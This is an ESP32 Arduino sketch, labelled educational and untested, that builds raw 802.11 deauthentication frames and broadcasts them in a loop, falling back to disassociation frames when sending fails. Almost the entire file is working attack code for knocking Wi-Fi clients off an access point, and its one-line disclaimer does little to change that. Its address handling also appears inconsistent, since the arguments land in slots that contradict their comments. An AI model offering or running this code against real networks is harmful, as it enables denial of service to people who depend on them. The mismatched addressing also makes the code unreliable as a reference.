/*
   Educational Example: Deauthentication Frame Transmission
   ----------------------------------------------------------
   This sketch demonstrates how a deauthentication packet might be constructed
   and transmitted using an ESP device (ESP32 in this example).

   DISCLAIMER: This code is for educational purposes only.
   Unauthorized deauthentication or jamming is illegal.
   V0.0.1 /UNTESTED/
*/

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"  // Include the ESP WiFi API

// Define a MAC address type for clarity
typedef uint8_t MacAddr[6];

// This is a template for a deauthentication packet. Some fields are placeholders
// that will be overwritten with actual values before transmission.
const uint8_t deauthPacket[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Frame Control: Type/Subtype (0xC0 indicates deauth)
    /*  2 - 3  */ 0x3A, 0x01,                         // Duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver Address (target); default is broadcast
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source Address (AP); placeholder value
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP); placeholder value
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & Sequence Number (to be updated)
    /* 24 - 25 */ 0x01, 0x00                          // Reason Code (0x0001: unspecified reason)
};

// Global buffer to build the packet before sending
uint8_t buffer[sizeof(deauthPacket)];
uint16_t seqnum = 0;  // Global sequence number for frames

// Function to change the WiFi channel. Adjusts the radio to the correct frequency.
esp_err_t change_channel(uint8_t channel) {
    // Set the WiFi channel on the ESP device (using WiFi interface type AP here)
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// Function to send a raw 802.11 frame using ESP WiFi APIs.
esp_err_t raw(const uint8_t* packet, int32_t len) {
    // Transmit the raw packet on the specified WiFi interface.
    // The 'false' parameter indicates that the function should not wait for
    // the transmission to complete.
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

// The deauth function constructs a deauthentication packet and sends it.
esp_err_t deauth(const MacAddr ap, const MacAddr station, const MacAddr bssid,
                 uint8_t reason, uint8_t channel) {
    esp_err_t res = change_channel(channel);
    if (res != ESP_OK) return res;

    // Copy the template packet into the working buffer
    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    // Overwrite the receiver address (offset 4) with the target MAC address.
    memcpy(&buffer[4], ap, 6);
    
    // Overwrite the source address (offset 10) with the AP's MAC address.
    memcpy(&buffer[10], station, 6);
    
    // Overwrite the BSSID (offset 16) with the AP's MAC address.
    memcpy(&buffer[16], bssid, 6);
    
    // Insert the current sequence number at offset 22.
    memcpy(&buffer[22], &seqnum, 2);
    
    // Set the reason code at offset 24.
    buffer[24] = reason;

    // Increment sequence number for the next packet.
    seqnum++;

    // Transmit the packet.
    res = raw(buffer, sizeof(deauthPacket));
    if (res == ESP_OK) return ESP_OK;

    // If transmission fails, as a fallback modify the frame type to disassociation
    buffer[0] = 0xA0; // 0xA0 represents a disassociation frame type/subtype.
    return raw(buffer, sizeof(deauthPacket));
}

void setup() {
    Serial.begin(115200);
    Serial.println("Deauth example - Educational Only");

    // Initialize WiFi in a mode that disables normal network operation,
    // allowing us to send raw frames.
    WiFi.mode(WIFI_MODE_NULL);
    esp_wifi_set_mode(WIFI_MODE_NULL);

    // Additional WiFi initialization may be required here depending on your hardware.
    delay(1000);
}

void loop() {
    // Example MAC addresses (replace with actual values for your test environment)
    MacAddr target = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast address
    MacAddr ap = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};      // Example AP MAC address
    MacAddr bssid = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};   // Example BSSID (usually same as AP MAC)

    // Attempt to send a deauthentication frame on channel 6 with reason code 1 (unspecified reason)
    esp_err_t res = deauth(ap, target, bssid, 1, 6);
    if (res == ESP_OK) {
        Serial.println("Deauth frame sent successfully.");
    } else {
        Serial.print("Failed to send deauth frame. Error: ");
        Serial.println(res);
    }

    delay(2000); // 2seconds 
}
